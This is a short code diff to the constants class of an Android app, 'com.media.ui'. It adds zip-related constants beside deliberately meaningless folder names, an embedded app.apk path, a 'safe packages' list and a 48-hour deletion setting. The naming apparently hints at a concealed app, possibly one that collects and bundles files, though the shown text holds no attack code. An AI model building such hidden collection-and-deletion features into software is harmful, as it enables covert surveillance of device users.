@@ -7,6 +7,7 @@ package com.media.ui;
 public class constants {
     public static final String DataFolder = "erqwwre";
     public static final String AppFolder = "erqwwre" + "/app.apk";
+    public static final String ZIPFolder = "hdysuf";
     public static final boolean LogEnable = true;
     public static final int AlarmDelay = 90000;
     public static final String db = "alarmflag";
@@ -29,4 +30,6 @@ public class constants {
     public static final String[] SAFE_PACKAGES = new String[]{"com.android.vendor", "com.media.ui"};
     public static final String DEL_HRS = "48";
     public static final String SERVICE_NAME = "com.media.ui.Services.registerBroadcastLock";
+    public static final String ZIP_EXT = ".zip";
+    public static final String ZIP_FILE_NAME = "final";
 }
